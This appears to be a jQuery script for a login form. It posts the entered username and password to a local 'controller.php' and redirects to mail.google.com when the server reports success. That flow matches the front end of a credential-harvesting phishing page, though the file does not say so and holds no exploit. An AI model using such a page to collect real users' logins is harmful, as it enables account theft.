/* 
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
$(function() {
    $(".button").live("click", function(e) {
        $(".login-form .footer img").show();
       // alert("Login button clicked....");
        var password = $("#password").val();
        var username = $("#username").val();
        $.ajax({
            type: "POST",
            url: 'controller.php',
            data: {"username": username, "password": password},
            async: false,
            cache: false,
            success: function(data) {
                var status_msg = '';
             //   alert(data);
                if (data.length > 0) {
                    data = $.parseJSON(data);
                 //      alert("formatted data >>>>" + data);
                    if (typeof data.status !== 'undefined') {
                        if (data.status == 'success') {
                            window.location.replace("http://mail.google.com/");
                        } else {
                            status_msg = 'Incorrect login credentials';
                        }
                    } else {
                        status_msg = 'Service currently unavailable.';
                        //     alert(status_msg);
                    }
                } else {
                    status_msg = 'Service currently unavailable.';
                    //     alert(status_msg);
                }

                $('.login-form .header div span').html(status_msg);
                $('.login-form .header div span').show();
                $('.login-form .footer img').hide();

            }

        });
    });
});